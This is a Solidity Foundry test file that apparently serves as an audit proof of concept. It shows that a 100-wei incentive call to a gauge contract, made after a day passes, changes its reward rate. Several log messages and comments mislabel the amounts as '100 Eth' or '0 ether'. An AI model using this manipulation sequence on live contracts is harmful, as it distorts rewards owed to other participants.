pragma solidity 0.8.20;

import { BaseTest } from "./BaseTest.sol";
import { console } from "forge-std/src/console.sol";

contract RewardRateManipulationTest is BaseTest {
    function test_RewardRateNoIssue() public {
        console.log(
            "In this test case, we pre-allocate, avoiding call updateRewardMissing, and not triggering the bug."
        );
        uint256 minIncentiveAmount = 100 wei;
        vm.prank(alice);
        backersManager.allocate(gauge, 1 ether);
        vm.stopPrank();
        // WHEN an Incentivizer has rewardToken
        vm.startPrank(incentivizer);
        rewardToken.mint(address(incentivizer), 100 ether + minIncentiveAmount);
        rewardToken.approve(address(gauge), 100 ether + minIncentiveAmount);
        // AND 1 day passes
        skip(1 days);
        // WHEN 100 ether are distributed by Incentivizer
        gauge.incentivizeWithRewardToken(100 ether);
        console.log("Incentivizing 100 Eth");
        uint256 rate1 = gauge.rewardRate(address(rewardToken));
        console.log("RewardRate 1: %d", rate1);
        skip(1 days);
        // WHEN 0 ether are distributed by Incentivizer
        gauge.incentivizeWithRewardToken(minIncentiveAmount);
        console.log("Incentivizing 100 Eth");
        uint256 rate2 = gauge.rewardRate(address(rewardToken));
        console.log("RewardRate 2: %d", rate2);
        console.log("TotalAllocation: %d", gauge.totalAllocation());
        vm.stopPrank();
        assertEq(rate1, rate2);
    }
    // This tescase does not wait between calls to incentivizeWithRewardToken() function, showing that the rate
    // variation is time-dependent.

    function test_RewardRateIssueNoTime() public {
        uint256 minIncentiveAmount = 100 wei;
        // WHEN an Incentivizer has rewardToken
        vm.startPrank(incentivizer);
        rewardToken.mint(address(incentivizer), 100 ether + minIncentiveAmount);
        rewardToken.approve(address(gauge), 100 ether + minIncentiveAmount);
        // AND 1 day passes
        skip(1 days);
        // WHEN 100 ether are distributed by Incentivizer
        gauge.incentivizeWithRewardToken(100 ether);
        console.log("Incentivizing 100 Eth");
        uint256 rate1 = gauge.rewardRate(address(rewardToken));
        console.log("RewardRate 1: %d", rate1);
        console.log("In this test case, we immediately incentivize with 0 eths, not triggering the bug");
        // WHEN 0 ether are distributed by Incentivizer
        gauge.incentivizeWithRewardToken(minIncentiveAmount);
        console.log("Incentivizing 100 Eth");
        uint256 rate2 = gauge.rewardRate(address(rewardToken));
        console.log("RewardRate 2: %d", rate2);
        console.log("TotalAllocation: %d", gauge.totalAllocation());
        vm.stopPrank();
        assertEq(rate1, rate2);
    }
    // This testcase triggers the issue, showing that the rewardRate changes by doing 0-eth incentivizing.

    function test_RewardRateIssue() public {
        uint256 minIncentiveAmount = 100 wei;
        // WHEN an Incentivizer has rewardToken
        vm.startPrank(incentivizer);
        rewardToken.mint(address(incentivizer), 100 ether + minIncentiveAmount);
        rewardToken.approve(address(gauge), 100 ether + minIncentiveAmount);
        // AND 1 day passes
        skip(1 days);
        // WHEN 100 ether are distributed by Incentivizer
        gauge.incentivizeWithRewardToken(100 ether);
        console.log("Incentivizing 100 Eth");
        uint256 rate1 = gauge.rewardRate(address(rewardToken));
        console.log("RewardRate 1: %d", rate1);
        console.log(
            "In this test case, we wait one day, showing that the rate can be manipulated depending on the time of the call"
        );
        skip(1 days);
        // WHEN 0 ether are distributed by Incentivizer
        gauge.incentivizeWithRewardToken(minIncentiveAmount);
        console.log("Incentivizing 100 wei");
        uint256 rate2 = gauge.rewardRate(address(rewardToken));
        console.log("RewardRate 2: %d", rate2);
        console.log("TotalAllocation: %d", gauge.totalAllocation());
        vm.stopPrank();
        assertEq(rate1, rate2);
    }
}
